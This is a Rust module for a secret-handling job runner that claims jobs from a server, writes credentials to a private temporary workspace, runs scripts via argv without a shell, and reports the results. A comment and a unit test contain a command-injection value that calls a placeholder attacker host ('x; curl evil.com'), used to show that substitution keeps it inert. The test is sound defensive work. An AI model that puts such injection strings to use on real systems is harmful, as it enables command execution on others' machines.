use std::collections::BTreeMap;
use std::io::Write;
use std::time::Duration;

use anyhow::{Context, Result};
use reqwest::Client;
use serde::Deserialize;

use crate::{config::Config, output::OutputManager};

/// What the server hands over when a job is claimed.
#[derive(Debug, Deserialize)]
struct ClaimedJob {
    id: i64,
    grant: String,
    #[serde(default)]
    params: BTreeMap<String, String>,
    implementation: Implementation,
    #[serde(default)]
    secrets: BTreeMap<String, String>,
    #[serde(default)]
    files: BTreeMap<String, String>,
}

#[derive(Debug, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
enum Implementation {
    Adapter {
        adapter: String,
        #[allow(dead_code)]
        config: serde_json::Value,
    },
    Script {
        script: String,
        command: Vec<String>,
    },
}

/// Claim, execute, report, repeat.
///
/// Outbound only: the runner dials the server, so the network it sits in needs no inbound port,
/// no Ingress, and no public endpoint (ADR 0008).
pub async fn run(config: &Config, output: &OutputManager, name: String) -> Result<()> {
    config
        .validate()
        .context("Configuration validation failed")?;
    output.print_info(&format!(
        "Runner '{name}' polling {} — this is the only place a grant executes.",
        config.server.url
    ));

    let client = Client::builder()
        // Longer than the server's long-poll window, so a quiet period is not an error.
        .timeout(Duration::from_secs(60))
        .build()
        .context("Failed to build HTTP client")?;

    loop {
        match claim(&client, config).await {
            Ok(Some(job)) => {
                let id = job.id;
                let grant = job.grant.clone();
                output.print_info(&format!("Running grant '{grant}' (job {id})"));

                let (exit_code, combined) = match execute(job) {
                    Ok(result) => result,
                    // A runner that cannot execute still has to report, or the job hangs until
                    // the server's timeout sweeps it.
                    Err(e) => (127, format!("runner could not execute: {e}")),
                };

                report(&client, config, id, exit_code, &combined).await?;
                if exit_code == 0 {
                    output.print_success(&format!("Job {id} succeeded"));
                } else {
                    output.print_warning(&format!("Job {id} exited {exit_code}"));
                }
            }
            Ok(None) => {}
            Err(e) => {
                output.print_warning(&format!("Poll failed, retrying: {e}"));
                tokio::time::sleep(Duration::from_secs(5)).await;
            }
        }
    }
}

async fn claim(client: &Client, config: &Config) -> Result<Option<ClaimedJob>> {
    let response = client
        .get(format!("{}/v1/jobs/claim", config.server.url))
        .bearer_auth(&config.server.token)
        .send()
        .await
        .context("Failed to reach server")?;

    let status = response.status();
    if !status.is_success() {
        let body = response.text().await.unwrap_or_default();
        anyhow::bail!("Server returned {status}: {body}");
    }
    Ok(response.json::<Option<ClaimedJob>>().await.unwrap_or(None))
}

async fn report(
    client: &Client,
    config: &Config,
    id: i64,
    exit_code: i32,
    output: &str,
) -> Result<()> {
    let response = client
        .post(format!("{}/v1/jobs/{id}/result", config.server.url))
        .bearer_auth(&config.server.token)
        .json(&serde_json::json!({ "exit_code": exit_code, "output": output }))
        .send()
        .await
        .context("Failed to report result")?;

    let status = response.status();
    if !status.is_success() {
        let body = response.text().await.unwrap_or_default();
        anyhow::bail!("Reporting job {id} failed ({status}): {body}");
    }
    Ok(())
}

/// Materialise the secrets, run the implementation, and collect the outcome.
///
/// Every file lives in one temp directory owned by a guard, so nothing survives an early return
/// or a panic — rather than a cleanup call at the bottom of the happy path, which is exactly the
/// line that gets skipped when an error path is added later.
fn execute(job: ClaimedJob) -> Result<(i32, String)> {
    let workspace = tempfile::Builder::new()
        .prefix("sealbox-job-")
        .tempdir()
        .context("Failed to create a working directory")?;

    let mut env: Vec<(String, String)> = Vec::new();
    let mut substitutions: BTreeMap<String, String> = job.params.clone();

    // Environment injection, for values a program reads from the environment.
    for (name, value) in &job.secrets {
        env.push((name.clone(), value.clone()));
    }

    // And the same values as an env-file, for consumers that ingest a batch — one declaration,
    // both forms.
    if !job.secrets.is_empty() {
        let path = workspace.path().join("env");
        let mut rendered = String::new();
        for (name, value) in &job.secrets {
            rendered.push_str(&format!("{name}={value}\n"));
        }
        write_private(&path, rendered.as_bytes())?;
        let path = path.to_string_lossy().into_owned();
        env.push(("SEALBOX_ENVFILE".to_string(), path.clone()));
        substitutions.insert("SEALBOX_ENVFILE".to_string(), path);
    }

    // File-shaped credentials: a kubeconfig, a docker config, an SSH key.
    for (name, value) in &job.files {
        let path = workspace.path().join(name.to_lowercase());
        write_private(&path, value.as_bytes())?;
        let path = path.to_string_lossy().into_owned();
        env.push((name.clone(), path.clone()));
        substitutions.insert(name.clone(), path);
    }

    let argv = match job.implementation {
        Implementation::Script { script, command } => {
            let path = workspace.path().join("implementation");
            write_private(&path, script.as_bytes())?;
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o700))
                    .context("Failed to make the implementation executable")?;
            }
            substitutions.insert("script".to_string(), path.to_string_lossy().into_owned());
            command
        }
        Implementation::Adapter { adapter, .. } => {
            anyhow::bail!(
                "adapter '{adapter}' is not implemented yet — grants using a script run today"
            )
        }
    };

    let argv: Vec<String> = argv.iter().map(|a| substitute(a, &substitutions)).collect();
    let (program, args) = argv.split_first().context("The grant's command is empty")?;

    // argv, never a shell: a parameter of `x; curl evil.com` is one odd argument.
    let out = std::process::Command::new(program)
        .args(args)
        .envs(env)
        .current_dir(workspace.path())
        .output()
        .with_context(|| format!("Failed to execute {program}"))?;

    let mut combined = String::from_utf8_lossy(&out.stdout).into_owned();
    let stderr = String::from_utf8_lossy(&out.stderr);
    if !stderr.is_empty() {
        combined.push_str(&stderr);
    }

    Ok((out.status.code().unwrap_or(-1), combined))
    // `workspace` drops here: every file carrying a secret goes with it.
}

/// Substitute `{name}` placeholders. Whole-token replacement into an argv element — the value is
/// never re-parsed, so nothing inside it can become a separate argument or a shell construct.
fn substitute(arg: &str, values: &BTreeMap<String, String>) -> String {
    let mut result = arg.to_string();
    for (name, value) in values {
        result = result.replace(&format!("{{{name}}}"), value);
    }
    result
}

fn write_private(path: &std::path::Path, contents: &[u8]) -> Result<()> {
    let mut file = std::fs::File::create(path)
        .with_context(|| format!("Failed to create {}", path.display()))?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        file.set_permissions(std::fs::Permissions::from_mode(0o600))
            .context("Failed to restrict permissions")?;
    }
    file.write_all(contents)
        .with_context(|| format!("Failed to write {}", path.display()))?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn substitution_is_whole_token_and_never_reparsed() {
        let mut values = BTreeMap::new();
        values.insert("ns".to_string(), "x; curl evil.com".to_string());
        values.insert("path".to_string(), "/tmp/a b".to_string());

        // The dangerous value lands in one argument and stays there.
        assert_eq!(substitute("{ns}", &values), "x; curl evil.com");
        assert_eq!(substitute("--ns={ns}", &values), "--ns=x; curl evil.com");
        // Spaces do not split anything either, because nothing re-parses the result.
        assert_eq!(substitute("{path}", &values), "/tmp/a b");
        // An unknown placeholder is left alone rather than becoming empty.
        assert_eq!(substitute("{unknown}", &values), "{unknown}");
    }
}
